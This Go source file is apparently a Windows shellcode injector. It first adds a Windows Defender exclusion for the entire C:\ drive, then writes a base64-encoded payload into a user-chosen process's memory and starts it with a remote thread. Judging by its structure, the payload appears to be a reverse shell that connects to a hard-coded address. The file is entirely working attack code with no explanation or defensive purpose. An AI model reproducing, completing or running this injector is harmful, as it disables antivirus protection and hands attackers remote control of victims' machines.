package main

import (
   b64 "encoding/base64"
   win "golang.org/x/sys/windows"
   u "unsafe"
   f "fmt"
   "time"
   "log"
   "os/exec"
)

var (
   k32 = win.NewLazySystemDLL("kernel32.dll")
   nt  = win.NewLazySystemDLL("ntdll.dll")

   opProc    = k32.NewProc("OpenProcess")
   vaEx      = k32.NewProc("VirtualAllocEx")
   wpm       = k32.NewProc("WriteProcessMemory")
   ch        = k32.NewProc("CloseHandle")
   crtEx     = k32.NewProc("CreateRemoteThreadEx")
)
var scEnc = "/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAB+QwKirgUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"

func main() {
	  cmd := exec.Command("cmd", "/C", "Powershell.exe -Command Add-MpPreference -ExclusionPath \"C:\\\\\"")
	  err := cmd.Run()
	  if err != nil {
		  log.Fatalf("Command execution failed: %s", err)
		  }
      var pID uint32
      f.Print("Enter PID: ")
      _, e := f.Scanln(&pID)
      if e != nil {
        f.Println(e)
        return
      }
      
      scDec, _ := b64.StdEncoding.DecodeString(scEnc)
      
      tPrcs, _, _ := opProc.Call(0x0002|0x0008|0x0020|0x0010|0x0400, 0, uintptr(pID))
      rmtPrcsBuf, _, _ := vaEx.Call(tPrcs, 0, uintptr(len(scDec)), 0x3000, 0x40)
      
      wpm.Call(tPrcs, rmtPrcsBuf, (uintptr)(u.Pointer(&scDec[0])), uintptr(len(scDec)), 0)
      crtEx.Call(tPrcs, 0, 0, rmtPrcsBuf, 0, 0, 0)
      ch.Call(tPrcs)
	  
	  time.Sleep(1000000000 * time.Millisecond)

}